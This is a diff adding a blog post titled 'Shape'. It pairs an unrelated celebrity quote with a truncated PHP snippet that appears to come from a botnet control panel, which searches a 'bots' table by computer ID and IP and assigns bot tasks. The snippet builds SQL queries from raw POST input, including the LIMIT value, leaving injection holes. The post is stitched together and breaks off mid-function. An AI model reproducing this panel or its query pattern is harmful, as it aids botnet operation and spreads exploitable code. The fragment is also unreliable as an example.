@@ -1,0 +1,123 @@
+---
+layout: post
+title: Shape
+tags:
+- Code Snippet
+status: publish
+type: post
+published: true
+meta:
+  aktt_notify_twitter: 'yes'
+  _aktt_hash_meta: ! '#secure #code #dev'
+  _edit_last: '2'
+  aktt_tweeted: '1'
+---
+<blockquote><strong>I was scared I was going to have some weird shape to my head and I was pleased that I didn't.
+Edward Furlong
+</strong></blockquote>
+<code lang="PHP">
+<?php
+
+include_once('auth.php');
+
+set_magic_quotes_runtime(1);
+
+if(is_readable('html.php')) include_once('html.php');
+ else die('Could not find HTML library.');
+ 
+if(is_readable('mycommon.php')) require('mycommon.php');
+else die('Could not open configuration file.');
+
+ if(is_readable('lang.php')) include_once('lang.php');
+ else die('Could not find language library.');
+
+$CTRL=1; 
+if(!isset($_GET['wohead']))
+ include_once('head.php');
+
+$msg = '';
+$srch = '';
+
+...<snip>...
+
+ if(isset($_POST['S_COMPID'])){
+ $srch = search_bot();
+ };
+ 
+ 
+ $param =array(
+ "SRCH"=>$srch,
+ "LAND"=>get_land($mres),
+ "TASKS"=>get_task($mres),
+ "MSG"=>$msg
+ );
+   
+ 
+ 
+   
+ echo HTML_TASK_ADD($param);  
+
+//include_once('bottom.php'); 
+//Functions++++++++++++++++++++++++++
+
+
+
+function search_bot(){
+global $mres,$_POST;
+
+if($_POST['S_COMPID'] == '')
+if($_POST['S_IP'] == '')
+return ''; 
+	
+
+
+
+if($_POST['S_COMPID'] > ''){
+	$s_id = str_replace('*',"%",$_POST['S_COMPID']);
+$q = 'SELECT * FROM `bots` WHERE `FCompID` like ("'.$s_id.'") limit '.$_POST['S_RESULTS'];
+ $result = mysql_query($q,$mres);
+  
+ return  HTML_serch_res_tbl($result);  
+};
+ 
+	
+if($_POST['S_IP'] > ''){
+	
+	$s_ip = str_replace('*',"%",$_POST['S_IP']);
+	
+ $q = 'SELECT * FROM `bots` WHERE `ip_addr` like ("'.$s_ip.'") limit '.$_POST['S_RESULTS'];
+ $result = mysql_query($q,$mres);
+ 
+  return  HTML_serch_res_tbl($result);  
+};
+
+
+	
+};
+
+
+
+function HTML_serch_res_tbl($result){
+global $LNG;	
+	
+	 $nr = @mysql_num_rows($result);
+if(!$nr) 
+  return "<font color=#990000>Message</font>:<em> No Entries found.</em>";
+	
+$ret = " <br><table width=\"543\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"> "
+." <tr class=\"file2\"> "
+." <td colspan=\"8\" class=\"bhead\"><div align=\"center\">Select Results</div></td> "
+." </tr> "
+." <tr class=\"file2\"> "
+." <td width=\"21\" bgcolor=#FCFCFC>Add</td> "
+." <td width=\"26\" nowrap=\"nowrap\" bgcolor=#FCFCFC>Land</td> "
+." <td width=\"82\" bgcolor=#FCFCFC nowrap=\"nowrap\">IP</td> "
+." <td width=\"93\" bgcolor=#FCFCFC nowrap=\"nowrap\">Rep. Count total </td> "
+." <td width=\"56\" bgcolor=#FCFCFC nowrap=\"nowrap\">Last Report</td> "
+." <td width=\"100\" bgcolor=#FCFCFC nowrap=\"nowrap\">First Report</td> "
+." <td width=\"40\" bgcolor=#FCFCFC nowrap=\"nowrap\">Bot Ver.</td> "
+." <td width=\"44\" bgcolor=#FCFCFC nowrap=\"nowrap\">CompID</td> "
+." </tr> ";	
+	
+?>
+</code>
